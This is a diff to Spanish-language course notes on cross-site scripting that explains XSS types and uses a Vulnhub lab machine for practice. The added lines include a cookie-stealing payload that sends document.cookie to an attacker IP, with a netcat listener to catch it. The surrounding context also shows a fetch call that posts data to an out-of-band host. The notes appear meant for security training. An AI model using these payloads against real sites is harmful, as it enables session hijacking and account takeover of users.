@@ -8,7 +8,7 @@ En esencia, un ataque XSS implica la inserción de código malicioso en una pág
 
 Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:
 
--   **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario.
+-   **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, que luego se ejecuta en el navegador del usuario. Este ataque es cuando el atacante da un enlace (link) y la victima al momento de darle click ejecuta el payload XSS en su buscador como parte de la respuesta, ahí se puede acontecer el 'Cookie Stealing'.
 -   **Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
 -   **DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.
 
@@ -18,8 +18,50 @@ A continuación, se proporciona el proyecto de GitHub correspondiente al laborat
 
 -   **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)
 * [Ejercicios-XSS](https://sudo.co.il/xss/)
+* [Lista de payloads XSS](https://github.com/payloadbox/xss-payload-list )
 
 Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en donde podemos colocar las inyecciones.
+
+Los atasques de XSS son tipicamente explotados con los siguientes objetivos:
+	* Robo de Cookies / Robo de Sesiones: Robar sesiones de usuarios con sesiones autenticadas, permite loggearte como otros usuarios aprovechando la autenticacion contenida dentro de la cookie de sesión. 
+	* Explotación del buscador: Explotar las vulnerabilidades del buscador 
+	* Keylogging: Registro de las entradas de teclado realizadas por otros usuarios en una aplicación web.
+	* Phishing: Puedes inyectar falsos 'login forms' dentro de la pagina web para capturar credenciales y muchas cosas mas. 
+
+## Maquina para practicar los XSS
+
+En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.
+
+Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.
+
+A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:
+
+-   **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
+
+## XSS reflejado en WordPress
+
+```bash 
+1. Wpscan + API = Te dice si un plugin tiene un XSS reflejado, puede ser 'autenticado o no-autenticado'
+2. Buscar en 'Searchsploit' el plugin con la vulnerabilidad 
+3. Combinar los link tanto el del exploit que contiene el codigo javascript malicioso asi como la url de nuestra maquina victima, con el fin de poder abrilo todo junto en una nueva pagina y que se ejecute el XSS reflejado, aqui podemos hacer un 'Cookie stealing'
+```
+
+## XSS almacenado (persistente)
+
+```bash 
+1. Este tipo de XSS se dan en blogs como 'ApPHP', la vulnerabilidad puede estar en el nombre, comentario, etc...
+2. Tambien se dan en forums como 'MyBB'. Funciona como Wordpress ya que tambien contiene 'plugins'
+```
+
+```bash 
+# Descargamos el escaner de MYBB en kali para ver si alguno de los plugins contiene la vulnerabilidad del XSS alamcenado 
+
+❯ https://github.com/0xB9/MyBBscan              # Repositorio el cual contiene el escaner
+
+❯ pip install huepy                             # instalamos las dependencias 
+❯ ./scan.py                                     # Ejecutamos el escaner que se encuentra dentro del dir descargado 
+	❯ https://domain.com/index.php             # colocamos la IP que contiene el 'MyBB Forum'
+```
 
 ## HTML
 
@@ -52,6 +94,7 @@ Los XSS pueden interpretar código en **HTML y/o  JavaScript** y es ahí en dond
 <script>                               /// Para mandar algo por el metodo POST a un dominio 
   fetch('https://kwklry4t8e18m8q8k5uikgydy44vslga.oastify.com',{method:'POST', mode:'no-cors', body:'omar'});
 </script>
+
 ```
 
 ## Recibir información por medio de un 'Alert'  
@@ -196,6 +239,19 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 ❯ python -m SimpleHTTPServer               # Nos montamos un servidor http 80 para que la victima acceda al archivo malicioso 
 ```
 
+## Cookie Hijacking 
+
+```javascript 
+// Podemos mandar todo el payload en una sola url y mantenernos en escucha para cuando sea ejecutado obtengamos la cookie de sesion 
+
+// Colocamos este payload en donde se acontece el XSS reflejado en la pagina y de ahi obtenemos la url final, la cual podemos mandar a la maquina victima para hacer el robo de su sesion 
+<script>new Image().src='http://IP_Atacante:443/?cookie=' + encodeURI(document.cookie);</script> 
+```
+
+```bash 
+❯ nc -nlvp 443      # Nos ponemos en escucha para recibir la cookie
+```
+
 ## Victima cree un post en una web 
 
 ```javascript
@@ -232,14 +288,5 @@ External JavaScript Source, podemos cargar código desde un servidor externo par
 ❯ python3 -m http.server 80            # Nos montamos un servidor http 80 para que el usuario pueda acceder a nuestro archivo malicioso 
 ```
 
-## Maquina para practicar los XSS
-
-En esta clase, trataremos de resolver una máquina de la plataforma de **Vulnhub** para practicar los ataques XSS.
-
-Vulnhub es una plataforma de seguridad informática que se centra en la creación y distribución de máquinas virtuales vulnerables con el fin de mejorar las habilidades de los profesionales de la seguridad informática. La plataforma proporciona una amplia variedad de máquinas virtuales (VM) que se han configurado para contener vulnerabilidades deliberadas que pueden ser explotadas para aprender y reforzar técnicas de hacking.
-
-A continuación, se proporciona el enlace a la máquina que nos descargamos en esta clase para practicar esta vulnerabilidad:
-
--   **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)
 
 
